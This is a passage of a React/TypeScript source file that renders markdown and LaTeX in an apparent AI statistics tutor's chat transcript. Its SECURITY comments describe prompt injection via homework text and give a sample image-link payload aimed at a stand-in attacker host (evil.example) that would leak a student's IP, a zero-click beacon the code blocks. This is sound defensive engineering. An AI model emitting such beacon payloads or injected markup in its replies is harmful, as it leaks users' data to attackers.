/* --------------------------------------------------------------------------
   Message — a single turn in the conversation.

   Discriminated union on `role`:

   'ai'      — No fill, no border, no speaker label. Pure text at body size.
               The visual differentiation from student messages (no bubble,
               left-aligned) is sufficient — same pattern as Claude / ChatGPT.
               Renders children as-is (may include CodeBlock, paras, etc.)
               When `isStreaming` is true, appends three Heritage Gold dots
               oscillating in a wave.

   'student' — Right-aligned. Soft surface (#F2EFE9). Distinctive asymmetric
               corner radius (16/16/4/16 — bottom-right is the pointing corner).
               max-width 80% of column.

   'system'  — Centered, very small, muted, mono small-caps.
               E.g. "· submitted at 11:34 ·"

   #327: this file also owns MARKDOWN + MATH rendering for the tutor's turns.
   Before this, nothing on the message surface parsed anything: a reply
   containing "\n\n" collapsed into one run-on paragraph, a "# Sample Spaces"
   heading rendered as a literal "#", and LaTeX leaked raw into the transcript
   ("\(\{HH, HT, \dots\}\)" was visible, verbatim, to students). For a
   statistics tutor that is not a cosmetic gap -- the notation IS the content.
   -------------------------------------------------------------------------- */

import {
  Children,
  Fragment,
  isValidElement,
  memo,
  useCallback,
  useEffect,
  useRef,
  useState,
  type ReactNode,
} from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import remarkMath, { type Options as RemarkMathOptions } from "remark-math";
import rehypeKatex, { type Options as RehypeKatexOptions } from "rehype-katex";
/* KaTeX's stylesheet is NOT imported here, deliberately. Importing it from
   this module pinned it into every consumer of the @llteacher/ui barrel --
   apps/admin renders no Message at all, yet shipped katex.min.css plus all 59
   font files, because the CSS glob in package.json's `sideEffects` field
   (which is what lets the JS itself tree-shake) makes a CSS import
   unremovable.

   The app that renders messages imports it instead, from its own entry:
   apps/web/src/client/main.tsx. Importing from TS rather than @import-ing
   into styles.css still matters there -- it is what makes the bundler rebase
   the font url()s into the app's own /assets, so nothing reaches a CDN at
   runtime (Cloudflare Workers today, AWS later). Any future app that renders
   a transcript must add the same import to its entry. */
import { Copy, Check, WarningCircle } from "@phosphor-icons/react";
import { CodeBlock } from "./CodeBlock";
import {
  CodeExecution,
  splitRCodeSegments,
  type RCodeResult,
} from "../generative/renderers/CodeExecution";

/* ==========================================================================
   Markdown + math rendering

   WHY react-markdown rather than a hand-rolled renderer (the two options
   weighed for #327):

   1. It is already the house tool. apps/admin renders instructor-authored
      section content with `react-markdown` + `remark-gfm` (see
      HomeworkForm.tsx and the .admin-markdown-preview rules in styles.css),
      so the parser, its transitive tree, and its behaviour are already in
      this monorepo's dependency graph and already reviewed. A second,
      bespoke parser would mean two markdown dialects in one product -- an
      instructor's problem statement rendering differently in the console
      than the tutor's answer quoting it back.

   2. It renders to React ELEMENTS, never to an HTML string. The whole class
      of "LLM emits <img onerror=...>" injection is structurally absent: raw
      HTML in the source is inert text unless `rehype-raw` is added, and it
      is not. See the SECURITY note below for the full argument.

   3. Emphasis, nested lists and list-tightness rules are exactly the part of
      markdown that is fiddly to hand-roll and that nobody wants to own.

   The one thing it does NOT do is LaTeX-style delimiters: remark-math reads
   `$...$` / `$$...$$` only, and the actual defect reported was `\(...\)`
   leaking through. That is handled by the remarkLatexMath PLUGIN below.
   ========================================================================== */

/* -- SECURITY --------------------------------------------------------------
   This surface renders model output, i.e. text an attacker can influence via
   prompt injection through a homework body. Four properties keep it from
   becoming an XSS or a tracking hole, and all four are load-bearing:

   a) No `dangerouslySetInnerHTML` anywhere in this file, and none reachable
      from it. react-markdown builds React elements from the mdast/hast tree;
      React escapes every text node it renders. rehype-katex is likewise safe
      by construction -- it converts KaTeX's output into hast nodes
      (hast-util-from-html-isomorphic) which react-markdown then renders as
      elements, so KaTeX HTML is never handed to innerHTML either.

   b) `rehype-raw` is deliberately NOT installed. Without it, an HTML tag in
      the markdown source is dropped/escaped rather than parsed, so `<script>`
      / `<iframe>` / event-handler attributes in a model reply are text.

   c) Link hrefs go through react-markdown's default `urlTransform`, which
      strips `javascript:`, `vbscript:` and `data:` (non-image) URLs. It is
      left at its default ON PURPOSE -- passing a custom urlTransform is the
      usual way people accidentally disable it. The `a` override below only
      adds rel/target; it never widens what is allowed.

   d) #327 review finding 5: `![x](https://evil.example/t.png?u=alice)` in a
      reply used to render a real <img src>, which FETCHES on render -- a
      zero-click beacon that leaks the student's IP, user-agent and the fact
      they were reading that homework, to an attacker-chosen host, and there
      is no CSP anywhere in this repo to catch it. Attacker-controlled text
      must never reach a network-fetching attribute, so the `img` override
      below renders the alt text instead of an image. Remote images are not
      a feature of this product; nothing legitimate regresses.

   KaTeX is additionally run with `trust: false` (its default), which is what
   disables \href, \url, \includegraphics and the \html* family, plus bounded
   `maxExpand`/`maxSize` so a macro-expansion or \rule bomb in a reply cannot
   hang or paper over the page.
   -------------------------------------------------------------------------- */

/* ==========================================================================
   remarkLatexMath — LaTeX-style delimiters, converted in the TREE

   Models emit both math dialects freely (OpenRouter-routed models in
   particular default to `\( ... \)`), and remark-math reads only the dollar
   forms -- which is why `\(\{HH, HT, \dots\}\)` reached students verbatim.

   The FIRST attempt at this rewrote the delimiters in the markdown SOURCE
   STRING before parsing: `\(x\)` -> `$x$`, `\[x\]` -> `\n\n$$\nx\n$$\n\n`.
   The #327 review proved four separate defects, all of them consequences of
   that one decision, and all of them dissolved by moving the conversion into
   the tree instead:

     finding 1/2 - emitting a `$` into a document that already contains one.
       "A ticket costs $5. The chance is \(p\) each draw." became garbage,
       because the `$` this code emitted paired with the `$` in "$5".
       Currency and probability in one sentence is house style here. A plugin
       that builds an inlineMath NODE never emits a `$`, so it cannot collide.

     finding 3 - injecting `\n\n` to force display mode BROKE THE ENCLOSING
       CONTAINER. A blank line ends a list item, a blockquote and a table
       row: an ordered list split into two <ol>s and renumbered, a blockquote
       split with its `>` markers swallowed into the TeX, a table cell
       emptied and leaked `| 2 |` as literal text. Replacing a node IN PLACE
       cannot escape its container.

     finding 4 - `\[` is CommonMark's escape for a literal `[`, and models
       write "the interval \[0, 1\]". See DISPLAY MATH VS. ESCAPED BRACKET.

   It also deletes the hand-rolled `splitCodeRegions` fence scanner the string
   pass needed: mdast already distinguishes `code` and `inlineCode` nodes, so
   code regions are skipped by construction rather than by re-implementing
   CommonMark's fence rules.

   HOW IT READS THE DELIMITERS AT ALL. By the time remark hands us the tree,
   `\(` is GONE: `(` is ASCII punctuation, so CommonMark has already resolved
   `\(` to a literal `(` in the text node's `value`. The delimiters only exist
   in the original source, so each text node is matched against the source
   slice its `position` points at, walking `raw` and `value` in lockstep. That
   lockstep walk is also what makes finding 6 (`Literal \\(not math\\)`, an
   ESCAPED backslash) structurally impossible: the `\\` pair is consumed as an
   escape before the `(` is ever looked at, so a `\\(` can never open math.
   Any desync between the two strings (a character reference, say) aborts the
   rewrite for that node and leaves it exactly as CommonMark parsed it --
   failing to typeset is always preferable to corrupting the prose.

   DISPLAY MATH VS. ESCAPED BRACKET (finding 4). `\[` is genuinely ambiguous:
   CommonMark says "literal [", every LLM says "display math". The rule chosen
   here, and the reason for it:

       `\[ ... \]` is display math ONLY when the delimiters OWN THEIR LINES --
       nothing but whitespace (or the enclosing blockquote/list prefix) before
       the `\[` on its line, and nothing but whitespace after the `\]`.

   That is how models actually emit display math, it is the same shape
   remark-math already requires of `$$`, and it leaves every in-prose use --
   "the interval \[0, 1\]", "use the notation \[bracketed\] in prose" -- as
   the literal brackets CommonMark promises. The residual cost is a model
   that writes display math inline mid-sentence; that renders as bracketed
   text rather than as typeset math, which is the safe direction to be wrong.
   `\( ... \)` needs no such test: escaping a paren in markdown is a no-op
   nobody writes on purpose, so a paired `\(...\)` is always taken as math.

   LIMITATION, stated so the next reader does not rediscover it. Working on
   the tree means a delimiter pair must live inside ONE text node. If the TeX
   between the delimiters contains something CommonMark or GFM claims first --
   a bare URL (autolink literal), a `*emphasis*` pair -- the paragraph is
   already split into several nodes and the closing delimiter is in a
   different one, so nothing is converted and the source shows through. This
   is rare in real TeX (`_` between word characters is not emphasis, and
   `\times` is what models write for multiplication) and it fails in the safe
   direction: un-typeset notation, never corrupted prose. Fixing it properly
   means a micromark SYNTAX extension for `\(`/`\[`, the same layer
   remark-math itself works at -- worth doing if the shape ever shows up in
   real transcripts, not worth it on speculation.
   ========================================================================== */

/** A structural subset of mdast. Declared locally rather than imported from
 *  `@types/mdast` because that package is a TRANSITIVE dependency here (it
 *  arrives under react-markdown), and a type-only import of something this
 *  package does not declare breaks the day the tree is hoisted differently. */
interface MdastNode {
  type: string;
  value?: string;
  children?: MdastNode[];
  data?: Record<string, unknown>;
  position?: { start?: { offset?: number }; end?: { offset?: number } };
}

/** Nodes whose text is meant literally, or is already math. Never descended
 *  into. `code`/`inlineCode` are the reason splitCodeRegions could be
 *  deleted -- a tutor explaining `\(` inside a fence gets it back verbatim. */
const OPAQUE_NODES = new Set(["code", "inlineCode", "math", "inlineMath", "html"]);

/** Nodes that accept FLOW (block) content, and so can host a display-math
 *  node lifted out of one of their paragraphs. A `<pre>` may not live inside
 *  a `<p>`, so the paragraph is split at this level -- which, unlike the old
 *  `\n\n` injection, keeps the list item / blockquote itself intact. */
const FLOW_PARENTS = new Set(["root", "blockquote", "listItem", "footnoteDefinition"]);

/** The characters CommonMark lets a backslash escape (ASCII punctuation).
 *  A backslash before anything else is a literal backslash -- which is why
 *  `\frac` survives into the text node's value unharmed. */
const ESCAPABLE = "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";

function isEscapable(ch: string | undefined): boolean {
  return ch !== undefined && ESCAPABLE.includes(ch);
}

/** The mdast node remark-math itself builds for `$...$`, reproduced exactly
 *  -- including the `data.hName`/`hChildren` that mdast-util-to-hast turns
 *  into the `<code class="language-math math-inline">` that rehype-katex
 *  looks for. Building the node by hand is the whole point: no `$` is ever
 *  emitted into the document, so nothing can pair with a dollar in prose. */
function inlineMathNode(tex: string): MdastNode {
  return {
    type: "inlineMath",
    value: tex,
    data: {
      hName: "code",
      hProperties: { className: ["language-math", "math-inline"] },
      hChildren: [{ type: "text", value: tex }],
    },
  };
}

/** Display-math twin of inlineMathNode: `<pre><code class="math-display">`. */
function displayMathNode(tex: string): MdastNode {
  return {
    type: "math",
    value: tex,
    data: {
      hName: "pre",
      hChildren: [
        {
          type: "element",
          tagName: "code",
          properties: { className: ["language-math", "math-display"] },
          children: [{ type: "text", value: tex }],
        },
      ],
    },
  };
}

/** True when nothing but whitespace (or an enclosing blockquote/list prefix)
 *  sits between `offset` and the start of its line. */
function atLineStart(source: string, offset: number): boolean {
  for (let k = offset - 1; k >= 0; k -= 1) {
    const ch = source[k]!;
    if (ch === "\n") return true;
    if (ch !== " " && ch !== "\t" && ch !== ">") return false;
  }
  return true;
}

/** True when nothing but whitespace sits between `offset` and the line's end. */
function atLineEnd(source: string, offset: number): boolean {
  for (let k = offset; k < source.length; k += 1) {
    const ch = source[k]!;
    if (ch === "\n") return true;
    if (ch !== " " && ch !== "\t" && ch !== "\r") return false;
  }
  return true;
}

/** A text node's source slice still carries the enclosing container's line
 *  prefix on every line after the first -- "> " inside a blockquote, the
 *  continuation indent inside a list item -- plus any trailing spaces before
 *  a soft break. CommonMark already stripped all of that from the node's
 *  `value`, so strip it here too or the lockstep walk desyncs on line two of
 *  every quoted formula. */
function stripLinePrefixes(raw: string): string {
  return raw.replace(/[ \t]*\r?\n[ \t>]*/g, "\n");
}

/** Index of `delimiter` at or after `from`, skipping escaped pairs so the
 *  `\)` inside `\\)` is not mistaken for a closer. */
function findDelimiter(raw: string, from: number, delimiter: string): number {
  let k = from;
  while (k < raw.length) {
    if (raw[k] === "\\") {
      if (raw.startsWith(delimiter, k)) return k;
      k += 2;
      continue;
    }
    k += 1;
  }
  return -1;
}

/** How many characters of a text node's `value` a given source slice produced
 *  -- i.e. its length once backslash escapes collapse. Used to keep the
 *  `value` cursor aligned across a span consumed as math. */
function resolvedLength(rawSlice: string): number {
  let n = 0;
  for (let k = 0; k < rawSlice.length; k += 1) {
    if (rawSlice[k] === "\\" && isEscapable(rawSlice[k + 1])) k += 1;
    n += 1;
  }
  return n;
}

/** Split one `text` node into text / inlineMath / math nodes. Returns the
 *  node untouched (a single-element array) whenever nothing is found or
 *  anything at all looks off. */
function splitLatexMath(node: MdastNode, source: string, allowDisplay: boolean): MdastNode[] {
  const start = node.position?.start?.offset;
  const end = node.position?.end?.offset;
  const value = node.value ?? "";
  if (start === undefined || end === undefined) return [node];

  const rawSpan = source.slice(start, end);
  if (!rawSpan.includes("\\(") && !(allowDisplay && rawSpan.includes("\\["))) return [node];
  const raw = stripLinePrefixes(rawSpan);

  const out: MdastNode[] = [];
  let pending = "";
  let i = 0;
  let j = 0;
  let found = false;

  const flush = () => {
    if (pending !== "") {
      out.push({ type: "text", value: pending });
      pending = "";
    }
  };

  while (i < raw.length) {
    const ch = raw[i]!;

    if (ch === "\\") {
      const next = raw[i + 1];

      if (next === "(") {
        const close = findDelimiter(raw, i + 2, "\\)");
        const tex = close === -1 ? "" : raw.slice(i + 2, close).trim();
        if (tex !== "") {
          flush();
          out.push(inlineMathNode(tex));
          j += resolvedLength(raw.slice(i, close + 2));
          i = close + 2;
          found = true;
          continue;
        }
      } else if (next === "[" && allowDisplay) {
        const close = findDelimiter(raw, i + 2, "\\]");
        const tex = close === -1 ? "" : raw.slice(i + 2, close).trim();
        /* The line-ownership rule -- see DISPLAY MATH VS. ESCAPED BRACKET. */
        const opensLine = i === 0 ? atLineStart(source, start) : raw[i - 1] === "\n";
        const endsLine =
          close + 2 === raw.length ? atLineEnd(source, end) : raw[close + 2] === "\n";
        if (tex !== "" && opensLine && endsLine) {
          flush();
          out.push(displayMathNode(tex));
          j += resolvedLength(raw.slice(i, close + 2));
          i = close + 2;
          found = true;
          continue;
        }
      }

      /* Not a delimiter: an ordinary backslash escape, or a lone backslash
         (`\frac`). Either way it consumes exactly one character of `value`. */
      if (isEscapable(next)) {
        if (value[j] !== next) return [node];
        pending += next;
        i += 2;
        j += 1;
        continue;
      }
      if (value[j] !== "\\") return [node];
      pending += "\\";
      i += 1;
      j += 1;
      continue;
    }

    /* Any mismatch here means `raw` and `value` have drifted apart for a
       reason this walk does not model -- a character reference, most likely.
       Abandon the rewrite rather than emit mangled prose. */
    if (value[j] !== ch) return [node];
    pending += ch;
    i += 1;
    j += 1;
  }

  if (!found) return [node];
  if (j !== value.length) return [node];
  flush();
  return out.length > 0 ? out : [node];
}

/** A paragraph that now contains block-level math is split into a run of
 *  paragraphs and math nodes, in the paragraph's own parent. Note what this
 *  does NOT do: it never touches the grandparent, so the list item or
 *  blockquote holding the paragraph survives intact (#327 finding 3). */
function liftDisplayMath(paragraph: MdastNode): MdastNode[] {
  const children = paragraph.children ?? [];
  if (!children.some((child) => child.type === "math")) return [paragraph];

  const out: MdastNode[] = [];
  let run: MdastNode[] = [];

  const flushRun = () => {
    while (run.length > 0 && run[0]!.type === "text" && run[0]!.value?.trim() === "") run.shift();
    while (
      run.length > 0 &&
      run[run.length - 1]!.type === "text" &&
      run[run.length - 1]!.value?.trim() === ""
    ) {
      run.pop();
    }
    if (run.length > 0) out.push({ type: "paragraph", children: run });
    run = [];
  };

  for (const child of children) {
    if (child.type === "math") {
      flushRun();
      out.push(child);
    } else {
      run.push(child);
    }
  }
  flushRun();

  return out.length > 0 ? out : [paragraph];
}

/** #327 finding 10: remark-math's flow math closes at END OF INPUT, exactly
 *  like a code fence. Mid-stream that means every single token of a `$$`
 *  formula produces a `math` node holding a half-typed expression, KaTeX
 *  fails to parse it, and the student watches a red "KaTeX parse error"
 *  strobe once per token until the closing `$$` finally lands.
 *
 *  Of the two available fixes -- muting the error colour, or not typesetting
 *  an unterminated formula at all -- this takes the second. An unterminated
 *  formula is not an ERROR, it is an INCOMPLETE one, so rendering any error
 *  node for it is wrong at any hue; a muted one still redraws a distinct
 *  error element per token. Handing the raw source back as plain text is
 *  quiet, is what the pre-#327 transcript showed anyway, and flips to real
 *  typeset math the instant the closing fence arrives. errorColor stays red
 *  for genuinely CLOSED but malformed TeX, where the signal is true. */
function isUnterminatedMath(node: MdastNode, source: string): boolean {
  const start = node.position?.start?.offset;
  const end = node.position?.end?.offset;
  if (start === undefined || end === undefined) return false;
  const span = source.slice(start, end).trimEnd();
  return span.length < 4 || !span.endsWith("$$");
}

function rawParagraph(node: MdastNode, source: string): MdastNode {
  const start = node.position?.start?.offset ?? 0;
  const end = node.position?.end?.offset ?? 0;
  return { type: "paragraph", children: [{ type: "text", value: source.slice(start, end) }] };
}

/** @param allowDisplay - whether block math produced among THIS node's
 *  children can be lifted into a flow position by the caller. */
function transformNode(node: MdastNode, source: string, allowDisplay: boolean): void {
  if (OPAQUE_NODES.has(node.type) || !Array.isArray(node.children)) return;

  const isFlowParent = FLOW_PARENTS.has(node.type);
  let children: MdastNode[] = [];

  for (const child of node.children) {
    if (child.type === "text") {
      children.push(...splitLatexMath(child, source, allowDisplay));
    } else if (child.type === "math" && isFlowParent && isUnterminatedMath(child, source)) {
      children.push(rawParagraph(child, source));
    } else {
      transformNode(child, source, child.type === "paragraph" && isFlowParent);
      children.push(child);
    }
  }

  if (isFlowParent) {
    children = children.flatMap((child) =>
      child.type === "paragraph" ? liftDisplayMath(child) : [child],
    );
  }

  node.children = children;
}

/** The remark plugin itself. Runs after parsing, so remark-math has already
 *  claimed every `$$...$$`; this only ever sees what CommonMark left behind. */
function remarkLatexMath() {
  return (tree: unknown, file: unknown): void => {
    const value = (file as { value?: unknown } | null | undefined)?.value;
    /* No source, no delimiters to find -- `\(` does not survive parsing. */
    if (typeof value !== "string") return;
    transformNode(tree as MdastNode, value, false);
  };
}

/** Recursively flatten a ReactNode down to its text, used to recover the code
 *  string out of the <pre><code> pair react-markdown hands to the `pre`
 *  override. */
function flattenText(node: ReactNode): string {
  if (node === null || node === undefined || typeof node === "boolean") return "";
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(flattenText).join("");
  if (isValidElement<{ children?: ReactNode }>(node)) return flattenText(node.props.children);
  return "";
}

/* Fenced code routes into the EXISTING CodeBlock component rather than a
   bare <pre>, so a fence in a tutor reply gets the same hairline top/bottom
   rules, warm code surface and mono language label as every other code
   surface in the product. Overriding `pre` (not `code`) is what makes this
   unambiguous: react-markdown only ever emits `pre` for a code BLOCK, so
   there is no inline-vs-block guess to get wrong and no double render --
   the `code` override below is reached only by inline spans, because the
   block-level `code` element is consumed here and never rendered. */
function MarkdownPre({
  children,
  onRun,
}: {
  children?: ReactNode;
  onRun?: (code: string) => Promise<RCodeResult>;
}) {
  const child = Children.toArray(children)[0];
  if (isValidElement<{ className?: string; children?: ReactNode }>(child)) {
    /* Display math never reaches here: it is emitted as
       <pre><code class="language-math math-display">, and rehype-katex
       replaces the whole <pre> with typeset KaTeX nodes before render. */
    const lang = /language-([\w+#.-]+)/.exec(child.props.className ?? "")?.[1];
    /* mdast keeps the fence's trailing newline; CodeBlock renders its child
       verbatim inside <pre>, so it would show as a blank final line. */
    const code = flattenText(child.props.children).replace(/\n$/, "");

    /* #28/#366: an r-tagged fence is RUNNABLE, so it goes to CodeExecution
       (which renders a code block plus a Run affordance and a result pane)
       rather than to the read-only CodeBlock.

       This is the seam where markdown rendering and R execution meet. Before
       markdown existed here, renderTextWithCode owned the whole message: it
       split text on ```r fences and rendered EVERYTHING ELSE as a bare <p>,
       so a reply could have a Run button or formatting, never both. Detecting
       the fence during markdown rendering instead means the fence still runs
       and the prose around it is still prose.

       Scoped to r/R exactly as renderTextWithCode was: an untagged or
       json/shell fence must not be offered a Run button that would only fail
       against the R interpreter. `onRun` undefined stays a first-class state
       (#28's graceful-degradation requirement) -- it degrades to a read-only
       block, which is also what an instructor's transcript viewer wants. */
    if (lang === "r" || lang === "R") {
      return <CodeExecution code={code} onRun={onRun} />;
    }
    return <CodeBlock lang={lang}>{code}</CodeBlock>;
  }
  return <pre className="md-pre">{children}</pre>;
}

/* Headings are shifted down one level: `# ` in a reply becomes an <h2>. The
   conversation column already owns the page's <h1> (ConversationView's
   .conversation-header-title), and a transcript that mints a competing <h1>
   per turn wrecks heading-level navigation for screen-reader users. */
function buildMarkdownComponents(
  onRun?: (code: string) => Promise<RCodeResult>,
): Components {
  return {
    ...MARKDOWN_COMPONENTS,
    pre: (props) => <MarkdownPre {...props} onRun={onRun} />,
  };
}

const MARKDOWN_COMPONENTS: Components = {
  pre: MarkdownPre,
  code: ({ children }) => <code className="md-code">{children}</code>,
  h1: ({ children }) => <h2 className="md-h md-h--1">{children}</h2>,
  h2: ({ children }) => <h3 className="md-h md-h--2">{children}</h3>,
  h3: ({ children }) => <h4 className="md-h md-h--3">{children}</h4>,
  h4: ({ children }) => <h5 className="md-h md-h--4">{children}</h5>,
  h5: ({ children }) => <h6 className="md-h md-h--5">{children}</h6>,
  h6: ({ children }) => <h6 className="md-h md-h--6">{children}</h6>,
  /* href is whatever react-markdown's default urlTransform already cleared
     (see SECURITY (c)) -- this override only adds the rel/target hardening a
     new-tab link needs. */
  a: ({ href, children }) => (
    <a className="md-link" href={href} target="_blank" rel="noopener noreferrer nofollow">
      {children}
    </a>
  ),
  /* #327 finding 5 -- see SECURITY (d). An <img src> from a model reply is a
     zero-click beacon, so the URL never reaches the DOM at all; the alt text
     is rendered in its place so nothing disappears without a trace. */
  img: ({ alt }) => {
    const label = typeof alt === "string" ? alt.trim() : "";
    return <span className="md-image-alt">{label === "" ? "[image]" : label}</span>;
  },
};

/* #327 finding 2: `singleDollarTextMath: false` -- a LONE `$` in prose is
   never math. "If the payout is $10 with probability 0.5 and $0 otherwise"
   used to typeset "10 with probability 0.5 and " as an equation, and a
   statistics tutor talks about money constantly. `$$...$$` is unaffected.

   THE TRADEOFF, stated plainly: a model that writes `$x$` for inline math
   now gets a literal `$x$`. That is the deliberate trade -- corrupted
   currency is both worse and far commoner here than un-typeset notation --
   and the fix on the other side is a prompt instruction telling the model to
   use `\( ... \)`, which this file's remarkLatexMath handles natively. */
const REMARK_MATH_OPTIONS: RemarkMathOptions = { singleDollarTextMath: false };

const REMARK_PLUGINS = [remarkGfm, [remarkMath, REMARK_MATH_OPTIONS], remarkLatexMath];

/* trust:false is KaTeX's default and is what disables \href/\url/\includegraphics
   and the \html* family; it is named explicitly because it is the setting
   that must never quietly flip. maxExpand/maxSize bound a macro-expansion or
   \rule bomb in a model reply. output stays at the default htmlAndMathml so
   assistive tech gets real MathML rather than KaTeX's visual-only span soup. */
/* No `throwOnError`: rehype-katex omits it from its own Options because it
   always forces it false and turns a parse failure into a rendered error node
   instead. That is what we want -- one malformed \frac in a streamed reply
   must not throw inside render and take the whole transcript down with it. */
const KATEX_OPTIONS: RehypeKatexOptions = {
  strict: "ignore",
  trust: false,
  maxExpand: 500,
  maxSize: 40,
  output: "htmlAndMathml",
  /* --raw-error. A literal, not the token: KaTeX writes this into an inline
     style attribute on its own error span, and a var() there would resolve
     against whatever happens to be in scope rather than the design system.
     Reserved for TeX that is closed and still malformed; the mid-stream
     half-typed case is handled by isUnterminatedMath above, not by colour. */
  errorColor: "#C92A2A",
};

const REHYPE_PLUGINS = [[rehypeKatex, KATEX_OPTIONS] as const];

/** Render one markdown string as React elements. Exported so a caller that
 *  already holds the raw text (apps/web's App.tsx, once it stops pre-wrapping
 *  each text part in a bare <p> -- see renderTurnChildren below) can call it
 *  directly instead of relying on the unwrap shim.
 *
 *  memo() is load-bearing, not a micro-optimisation. App.tsx rebuilds EVERY
 *  turn's `content` from scratch on every render, and a streaming reply
 *  re-renders the column once per token -- so without this, every token
 *  arriving re-parses the markdown and re-typesets the KaTeX of all 200
 *  hydrated messages above it. The single prop is a string, so identical
 *  source short-circuits and only the turn actually growing does any work. */
export const MessageMarkdown = memo(function MessageMarkdown({
  children,
  onRun,
}: {
  children: string;
  /** #28/#366: injected by the app layer (useRExecution's `run`). Passed
   *  down to an r-tagged fence so it renders runnable; omitted, every fence
   *  is read-only. packages/ui has no business owning a WebR singleton --
   *  see CodeExecution's own doc comment. */
  onRun?: (code: string) => Promise<RCodeResult>;
}) {
  /* Rebuilt per render only when onRun changes identity -- the app layer
     memoises `run`, so in practice this is the module-level constant object
     for every message in a transcript. */
  const components = onRun ? buildMarkdownComponents(onRun) : MARKDOWN_COMPONENTS;
  return (
    <ReactMarkdown
      /* The `as never` casts are what unified's PluggableList needs for a
         [plugin, options] tuple; the option shapes themselves are still
         checked -- REMARK_MATH_OPTIONS and KATEX_OPTIONS above are each
         annotated with their own plugin's Options type. */
      remarkPlugins={REMARK_PLUGINS as never}
      rehypePlugins={REHYPE_PLUGINS as never}
      components={components}
    >
      {children}
    </ReactMarkdown>
  );
});

/* -- The bare-<p> unwrap shim ----------------------------------------------
   apps/web's App.tsx builds an AI turn's `content` as a fragment of
   `<p key=...>{part.text}</p>` -- one bare paragraph per streamed text part,
   with the raw markdown trapped inside it. Markdown has to own its own block
   structure (a heading, a list or a fenced block cannot live inside a <p>),
   so those wrappers are unwrapped here and their text re-rendered.

   The match is deliberately narrow -- a `p` with NO className whose only
   child is a string -- so the two other kinds of node App.tsx puts in the
   same fragment pass through untouched: `.message__stopped-note` (a `p`, but
   classed) and the generative-UI tool cards (not `p` at all).

   This lives here rather than in App.tsx only because message rendering and
   App.tsx are owned by different people this cycle. The better end state is
   App.tsx passing the raw string and this shim collapsing to the
   `typeof child === "string"` branch; it is one line there and this function
   already handles it.
   -------------------------------------------------------------------------- */
function isBareParagraph(
  child: ReactNode,
): child is React.ReactElement<{ className?: string; children?: ReactNode }> {
  if (!isValidElement<{ className?: string; children?: ReactNode }>(child)) return false;
  return (
    child.type === "p" &&
    child.props.className === undefined &&
    typeof child.props.children === "string"
  );
}

function renderTurnChildren(children: ReactNode): ReactNode {
  return Children.map(children, (child) => {
    if (typeof child === "string") return <MessageMarkdown>{child}</MessageMarkdown>;
    if (isBareParagraph(child)) {
      return <MessageMarkdown>{child.props.children as string}</MessageMarkdown>;
    }
    if (isValidElement<{ children?: ReactNode }>(child) && child.type === Fragment) {
      return renderTurnChildren(child.props.children);
    }
    return child;
  });
}

/** The markdown SOURCE behind a turn, recovered the same way it is rendered.
 *  Used for copy-to-clipboard: reading `textContent` off the DOM instead
 *  would hand the student KaTeX's rendered glyphs duplicated by the MathML
 *  fallback, plus list markers and language labels -- whereas the source is
 *  the thing that is actually useful to paste into notes or a lab report. */
/** A `<MessageMarkdown>` element whose child is the raw markdown string --
 *  what a caller passes once it renders markdown itself instead of relying on
 *  the bare-`<p>` shim above. `type` compares against the memo object because
 *  MessageMarkdown is wrapped in `memo()`; that object IS its element type. */
function isMessageMarkdown(
  child: ReactNode,
): child is React.ReactElement<{ children?: ReactNode }> {
  return (
    isValidElement<{ children?: ReactNode }>(child) &&
    child.type === MessageMarkdown &&
    typeof child.props.children === "string"
  );
}

function collectTurnSource(children: ReactNode): string {
  const parts: string[] = [];
  const walk = (node: ReactNode) => {
    Children.forEach(node, (child) => {
      if (typeof child === "string") {
        parts.push(child);
      } else if (isBareParagraph(child) || isMessageMarkdown(child)) {
        parts.push(child.props.children as string);
      } else if (isValidElement<{ children?: ReactNode }>(child) && child.type === Fragment) {
        walk(child.props.children);
      }
    });
  };
  walk(children);
  return parts.join("\n\n").trim();
}

/* ==========================================================================
   Component
   ========================================================================== */

export type MessageRole = "ai" | "student" | "system";

export interface AIMessageProps {
  role: "ai";
  isStreaming?: boolean;
  children: React.ReactNode;
}

export interface StudentMessageProps {
  role: "student";
  /** #28/#366: a student's own ```r fence is runnable too -- that is the only
   *  way their code reaches the transcript, since the composer submits plain
   *  markdown text with no separate R-mode message shape. Omitted, the fence
   *  renders read-only. */
  onRun?: (code: string) => Promise<RCodeResult>;
  children: React.ReactNode;
}

export interface SystemMessageProps {
  role: "system";
  children: React.ReactNode;
}

export type MessageProps =
  | AIMessageProps
  | StudentMessageProps
  | SystemMessageProps;

/** How long "Copied" stays up before the label settles back to "Copy". */
const COPY_FEEDBACK_MS = 1800;

type CopyState = "idle" | "copied" | "failed";

/* Icon rather than the word "Copy". The first pass used a mono small-caps
   text label to match .code-block__lang, but a per-turn affordance is not a
   label on a block -- it is a control that sits inside the reading column
   next to the tutor's prose, and a repeated uppercase COPY under every turn
   competes with the text it belongs to. Icon-only is also what every chat
   surface uses for this, so it needs no learning.

   It costs nothing in accessibility here: WCAG 2.5.3 Label in Name only
   binds when there IS visible text, so removing the label removes that
   constraint rather than violating it, and the button already carries a
   stable aria-label plus a live region for the transient state. Phosphor is
   the house icon set (TopNav, EditableTitle, Sidebar, ListControls). */
const COPY_GLYPH: Record<CopyState, typeof Copy> = {
  idle: Copy,
  copied: Check,
  failed: WarningCircle,
};

function AIMessage({ isStreaming = false, children }: Omit<AIMessageProps, "role">) {
  const source = collectTurnSource(children);
  const [copyState, setCopyState] = useState<CopyState>("idle");
  const resetTimer = useRef<ReturnType<typeof setTimeout> | undefined>(undefined);

  useEffect(() => () => clearTimeout(resetTimer.current), []);

  const handleCopy = useCallback(async () => {
    /* navigator.clipboard is absent in jsdom, absent on insecure origins, and
       can reject outright when the document has lost focus -- so this is a
       guarded attempt with a visible failure state, never an assumption. */
    const clipboard = typeof navigator === "undefined" ? undefined : navigator.clipboard;
    let ok = false;
    try {
      if (typeof clipboard?.writeText === "function") {
        await clipboard.writeText(source);
        ok = true;
      }
    } catch {
      ok = false;
    }
    setCopyState(ok ? "copied" : "failed");
    clearTimeout(resetTimer.current);
    resetTimer.current = setTimeout(() => setCopyState("idle"), COPY_FEEDBACK_MS);
  }, [source]);

  return (
    // #300: aria-busy so the log region below (ConversationView's
    // .conversation-log, role="log" aria-live="polite" -- #327 moved it
    // out of .conversation-inner, which now also holds non-turn content
    // like the breadcrumb/header actions) doesn't announce this message
    // while it's still filling in -- an
    // in-progress node inside a polite live region is otherwise
